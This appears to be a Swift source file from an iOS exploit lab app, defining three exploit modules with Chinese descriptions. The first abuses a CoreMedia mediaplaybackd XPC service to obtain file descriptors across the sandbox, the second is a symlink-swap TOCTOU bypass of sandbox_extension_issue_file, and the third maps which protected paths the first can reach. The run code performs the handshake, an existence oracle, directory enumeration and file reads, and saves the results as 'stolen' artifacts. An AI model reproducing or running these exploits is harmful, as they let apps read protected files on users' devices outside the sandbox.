import Foundation
import UIKit
import ImageIO

extension Catalog {

    /// The two primitives added after the first pass. Both are cross-sandbox: they are the
    /// only entries in the whole set that hand back bytes the app could never `open()`.
    static let crossSandbox: [ExploitModule] = [

        ExploitModule(
            id: "cm.fdleak",
            titleZh: "CoreMedia bytestream XPC 跨沙盒文件描述符获取",
            cve: "CVE-2026-112706",
            component: "CoreMedia · mediaplaybackd.bytestream.xpc",
            primitive: .infoLeak,
            reach: .systemProcess,
            tier: 1,
            summaryZh: """
            launchd 服务 com.apple.coremedia.mediaplaybackd.bytestream.xpc 对任何沙盒第三方应用可达，不校验 entitlement，也不触发权限提示。其 FigXPC 内存源握手（.rp1 → .rp2 → .org）对无特权客户端返回状态 0；随后的 'Curl' 创建消息在 CreationURL 里携带由客户端指定的绝对 file:// 路径，守护进程以自身凭据打开该路径，既不校验它是否位于请求方的沙盒容器内，也不校验该路径对请求方是否可读。回复的 ByteStreamDetails 字典携带一个活的 FileDescriptor。应用 dup 该描述符后用 pread 读取 —— 描述符级 I/O 不受客户端沙盒的路径检查约束，因此应用自身 open() 返回 EPERM 的文件，其完整内容会落入应用容器。
            """,
            notesZh: """
            同一原语附带三项能力：对受保护目录 'Curl' 返回目录描述符，fdopendir/readdir 可枚举其内容；真实但被拒的路径返回 -12203，不存在的路径返回 -17913，构成存在性预言机。iOS 27.0 封堵了 read / fdsc / getL 三个辅助 opcode（-16158），但 Curl 创建回复内的主描述符发放路径保持完整 —— 27.0 与 27.0.1 均已端到端验证。可读域经 27 个目标双向映射，仅 /private/var/mobile/Media/iTunes_Control/iTunes/ 可开；照片、信息、通讯录、TCC 数据库、钥匙串、Safari、健康、钱包及其它应用容器一律 -12203。写入路径两版均被拒（-12878），故该原语为读 / 枚举 / 预言机，不含写。
            """,
            run: { ctx in
                ctx.arm("cm.fdleak", "handshake + vend")
                var lines: [String] = []

                guard let session = FdLeak.Session() else {
                    ctx.fail("cm.fdleak", tl("无法建立会话"))
                    throw LabError(message: tl("CoreMedia 符号解析失败，或 XPC 连接无法创建"))
                }
                defer { session.shutdown() }

                lines.append(contentsOf: session.handshakeLog)
                lines.append(tl("握手建立: ") + "\(session.established)")

                if !session.established {
                    // Two very different situations look identical from here, so separate
                    // them: no reply at all means nothing is listening (simulator, or the
                    // service was removed); a reply that is not a dictionary means the
                    // daemon answered and refused.
                    let answered = session.replyTypes.contains { $0 == "dictionary" }
                    let silent = session.replyTypes.allSatisfy { $0 == "timeout" || $0 == "nil" }
                    lines.append("")
                    lines.append(tl("— 判定 —"))
                    lines.append(tl("连接对象已创建: ") + "\(session.connectionCreated)")
                    lines.append(tl("回复类型: ") + "\(session.replyTypes.joined(separator: ", "))")
                    let simulator: Bool = {
                        #if targetEnvironment(simulator)
                        return true
                        #else
                        return false
                        #endif
                    }()
                    if silent && simulator {
                        lines.append(tl("当前为模拟器：模拟器内不运行 mediaplaybackd，该 Mach 服务无人监听，"))
                        lines.append(tl("因此握手收不到任何回复。真机上该服务常驻，握手应返回字典。"))
                    } else if silent {
                        lines.append(tl("服务无人监听 —— 该构建可能已移除或重命名该 Mach 服务。"))
                    } else if !answered {
                        lines.append(tl("服务有回复但非字典 —— 握手被拒绝。"))
                    }
                    ctx.disarm("cm.fdleak", "handshake failed")
                    return ModuleOutcome(headline: silent ? tl("服务无人监听（本平台不适用）") : tl("握手被拒绝"),
                                         detail: lines.joined(separator: "\n"))
                }

                // control: the app's own open() on the same path must fail
                lines.append("")
                lines.append(tl("— 对照 —"))
                lines.append(session.directOpenControl(FdLeak.readableDomain))

                // existence oracle
                lines.append("")
                lines.append(tl("— 存在性预言机 —"))
                for path in [FdLeak.readableDomain,
                             FdLeak.readableDomain + "/cinder27_no_such_file"] {
                    let e = session.probeExistence(path)
                    let verdict = e.code == 0 ? tl("可开") :
                        (e.code == FdLeak.errAccessDenied ? tl("存在但被拒 (-12203)") :
                            (e.code == FdLeak.errNoSuchFile ? tl("不存在 (-17913)") : tl("错误码 ") + "\(e.code)"))
                    lines.append("\(verdict)  \(path)")
                }

                // directory enumeration
                lines.append("")
                lines.append(tl("— 目录枚举 —"))
                let listing = session.list(FdLeak.readableDomain)
                lines.append(tl("条目 ") + "\(listing.entries.count)" + tl(" 个（mode ") + "\(String(listing.vend.mode, radix: 8))" + tl("）"))
                for name in listing.entries.prefix(20) {
                    lines.append("  · \(name)")
                }

                // file theft
                lines.append("")
                lines.append(tl("— 读取 —"))
                var stolen: [URL] = []
                var totalBytes = 0
                for (label, path) in FdLeak.knownTargets {
                    let (data, vend) = session.read(path)
                    if let data = data {
                        totalBytes += data.count
                        let url = ctx.write("stolen_\(label)", data)
                        stolen.append(url)
                        let head = data.prefix(16).map { String(format: "%02x", $0) }.joined()
                        lines.append("✓ \(label)  \(data.count) B  uid=\(vend.uid)  head=\(head)")
                    } else {
                        lines.append("✗ \(label)  \(vend.note)")
                    }
                }

                ctx.disarm("cm.fdleak", "bytes=\(totalBytes)")
                return ModuleOutcome(
                    headline: totalBytes > 0 ? tl("跨沙盒读取 ") + "\(totalBytes)" + tl(" 字节") : tl("未取到数据"),
                    detail: lines.joined(separator: "\n"),
                    evidence: [
                        tl("对照: 应用自身 open() 被 EPERM 拒绝"),
                        tl("守护进程以自身凭据打开客户端指定的路径"),
                        tl("可读域: ") + "\(FdLeak.readableDomain)",
                        tl("iOS 27.2 起修复"),
                    ],
                    artifacts: stolen)
            }),

        ExploitModule(
            id: "sbx.toctou",
            titleZh: "sandbox_extension 符号链接 TOCTOU 越界读",
            cve: "",
            component: "libsystem_sandbox · sandbox_extension_issue_file",
            primitive: .oobRead,
            reach: .inProcess,
            tier: 1,
            summaryZh: """
            sandbox_extension_issue_file 在签发时解析符号链接，但不强制 SANDBOX_EXTENSION_NOFOLLOW。签发返回的令牌因此绑定的是签发时刻解析出的目标，而内核对消费时刻所用路径是否为令牌签发路径不做复核。构造顺序为：沙盒内建立符号链接 L 指向沙盒内文件 S；对 L 签发扩展（内核记录 S）；将 L 重指向沙盒外目标 T；消费令牌后经 L 读取。内核放行的是 S 所属的类别，而实际打开的是 T 的路径。
            """,
            notesZh: """
            该序列确定性成立，不需要竞态窗口 —— 链接切换发生在应用自身控制的两次系统调用之间，而非与内核并发。Apple 的立场是应用无法为不属于自己的路径签发扩展；这一前提成立，但与本问题无关：扩展是为应用确实拥有的路径签发的，随后该路径被改为指向别处。Apple 未将此视为安全问题，因此没有 CVE 编号，此处也不杜撰。可靠目标是 /etc 下的若干文件 —— 它们在 vnode 层可读，仅被沙盒配置文件拒绝，正是该原语跨越的缺口。
            """,
            run: { ctx in
                ctx.arm("sbx.toctou", "swap read")
                var lines: [String] = []

                guard SandboxExtension.available else {
                    ctx.fail("sbx.toctou", tl("符号不可用"))
                    throw LabError(message: tl("sandbox_extension_issue_file / consume 无法解析"))
                }

                let link = ctx.workdir.appendingPathComponent("cinder27_link")
                let decoy = ctx.workdir.appendingPathComponent("cinder27_decoy")

                var bypassed = 0
                var noSandbox = 0
                var blocked = 0
                var totalBytes = 0
                var artifacts: [URL] = []

                for (target, label) in SandboxExtension.knownTargets {
                    let r = SandboxExtension.readThroughSwap(target: target, link: link, decoy: decoy)
                    switch r.verdict {
                    case .bypassed:
                        bypassed += 1
                        totalBytes += r.bytes
                        if let data = r.data {
                            let name = target.replacingOccurrences(of: "/", with: "_")
                            artifacts.append(ctx.write("symlink_\(name)", data))
                        }
                        lines.append("✓ \(target)  \(r.bytes) B — \(label)")
                        lines.append(tl("   直接读 errno=") + "\(r.directErrno)" + tl("，经链接读到内容"))
                        lines.append("   \(r.preview)")
                    case .noSandbox:
                        noSandbox += 1
                        lines.append(tl("· ") + "\(target)" + tl("  直接读也成功 ") + "\(r.directBytes)" + tl(" B — 该平台未施加沙盒"))
                    case .blocked:
                        blocked += 1
                        lines.append(tl("✗ ") + "\(target)" + tl("  直接读 errno=") + "\(r.directErrno)" + tl("，经链接亦失败"))
                    case .empty:
                        lines.append(tl("· ") + "\(target)" + tl("  未读到内容 — ") + "\(r.note)")
                    }
                }

                let simulator: Bool = {
                    #if targetEnvironment(simulator)
                    return true
                    #else
                    return false
                    #endif
                }()

                lines.append("")
                lines.append(tl("— 判定 —"))
                lines.append(tl("跨越边界 ") + "\(bypassed)" + tl(" · 无沙盒 ") + "\(noSandbox)" + tl(" · 受阻 ") + "\(blocked)")
                if simulator && bypassed == 0 {
                    lines.append(tl("当前为模拟器：模拟器不对应用施加沙盒，直接读与经链接读都会成功，"))
                    lines.append(tl("因此该原语在此平台上无法给出证据。真机上直接读应返回 EPERM，"))
                    lines.append(tl("届时「直接读被拒 + 经链接读成功」即为越界成立的判定。"))
                }

                ctx.disarm("sbx.toctou", "bypassed=\(bypassed) nosandbox=\(noSandbox) blocked=\(blocked)")

                let headline: String
                if bypassed > 0 {
                    headline = tl("越过沙盒读取 ") + "\(bypassed)" + tl(" 个文件，共 ") + "\(totalBytes)" + tl(" 字节")
                } else if noSandbox > 0 {
                    headline = tl("该平台未施加沙盒 — 无证据")
                } else {
                    headline = tl("该构建上未越界")
                }

                return ModuleOutcome(
                    headline: headline,
                    detail: lines.joined(separator: "\n"),
                    evidence: [
                        tl("签发时解析链接目标，消费时不复核路径"),
                        tl("无需竞态窗口"),
                        tl("Apple 未将其视为安全问题，无 CVE"),
                        tl("判定依据：直接读被拒 且 经链接读成功"),
                    ],
                    artifacts: artifacts)
            }),

        ExploitModule(
            id: "cm.fdleak.boundary",
            titleZh: "跨沙盒可读域边界测绘",
            cve: "CVE-2026-112706",
            component: "CoreMedia · mediaplaybackd.bytestream.xpc",
            primitive: .probe,
            reach: .systemProcess,
            tier: 2,
            summaryZh: """
            对 15 个高价值目标逐一施加 'Curl' 探测，记录守护进程返回的服务端错误码，据此确定该原语的实际可读域。区分三种结果：可开、存在但被拒（-12203）、不存在（-17913）。这一轮的价值在于把负结果留在记录上 —— 一个被拒绝的目标与一个未被测试的目标，在结论上完全不同。
            """,
            notesZh: """
            源研究在 26.5 与 27.0 上共探测 27 个目标，结论一致：仅 iTunes 媒体库目录可开。照片库、信息、通讯录、TCC、钥匙串、Safari、健康、钱包、其它应用容器与共享 App Group 全部拒绝。此模块复现该测绘，使边界成为本机上的实测数据而非引用。
            """,
            run: { ctx in
                ctx.arm("cm.fdleak.boundary", "probe 15 targets")
                guard let session = FdLeak.Session() else {
                    ctx.fail("cm.fdleak.boundary", tl("符号解析失败"))
                    return ModuleOutcome(headline: tl("CoreMedia 符号不可用"),
                                         detail: tl("无法 dlopen CoreMedia 或解析 FigXPC 入口"))
                }
                defer { session.shutdown() }

                guard session.established else {
                    // No daemon on this platform (simulator) or the service was removed.
                    let silent = session.replyTypes.allSatisfy { $0 == "timeout" || $0 == "nil" }
                    ctx.disarm("cm.fdleak.boundary", "no session")
                    var lines = session.handshakeLog
                    lines.append("")
                    lines.append(tl("回复类型: ") + "\(session.replyTypes.joined(separator: ", "))")
                    lines.append(silent
                        ? tl("该 Mach 服务无人监听 —— 本平台不适用（模拟器内不运行 mediaplaybackd）。真机上该服务常驻。")
                        : tl("服务有回复但握手被拒绝。"))
                    return ModuleOutcome(headline: silent ? tl("服务无人监听（本平台不适用）") : tl("握手被拒绝"),
                                         detail: lines.joined(separator: "\n"))
                }

                var lines: [String] = []
                var reachable = 0, denied = 0, absent = 0
                for path in FdLeak.boundaryProbes {
                    let e = session.probeExistence(path)
                    switch e.code {
                    case 0:
                        reachable += 1
                        lines.append(tl("可开        ") + "\(path)")
                    case FdLeak.errAccessDenied:
                        denied += 1
                        lines.append(tl("存在·被拒   ") + "\(path)")
                    case FdLeak.errNoSuchFile:
                        absent += 1
                        lines.append(tl("不存在      ") + "\(path)")
                    default:
                        lines.append(tl("码 ") + "\(e.code)" + tl("   ") + "\(path)")
                    }
                }
                ctx.disarm("cm.fdleak.boundary", "r=\(reachable) d=\(denied) a=\(absent)")
                return ModuleOutcome(
                    headline: "\(reachable)" + tl(" 可开 · ") + "\(denied)" + tl(" 存在但被拒 · ") + "\(absent)" + tl(" 不存在"),
                    detail: lines.joined(separator: "\n"),
                    evidence: [tl("-12203 = 存在但被拒"), tl("-17913 = 不存在")])
            }),
    ]
}
